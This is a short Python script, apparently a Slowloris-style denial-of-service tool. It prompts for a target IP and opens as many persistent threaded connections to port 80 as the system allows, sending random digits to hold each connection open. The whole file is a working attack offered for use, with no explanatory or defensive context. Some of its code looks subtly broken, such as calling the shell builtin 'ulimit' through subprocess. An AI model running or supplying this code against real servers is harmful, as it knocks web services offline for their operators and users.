import socket
import random
import threading
import time
import subprocess

class SlowL:
	def __init__(self, ip, port):
		self.ip = socket.gethostbyname(ip)
		self.port = port
		while True:
			if threading.active_count() < int(subprocess.check_output(["ulimit", "-n"])) - 10:
				t = threading.Thread(target=self.handler)
				t.daemon = True
				t.start()
			print("Open count: " + str(threading.active_count()))

	def handler(self):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((self.ip, self.port))
		except:
			return
		while True:
			try:
				sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
				sock.recv(1024)
			except:
				sock.close()
				break

if __name__ == '__main__':
	ips = input("IP NOW: ")
	s = SlowL(ips, 80)
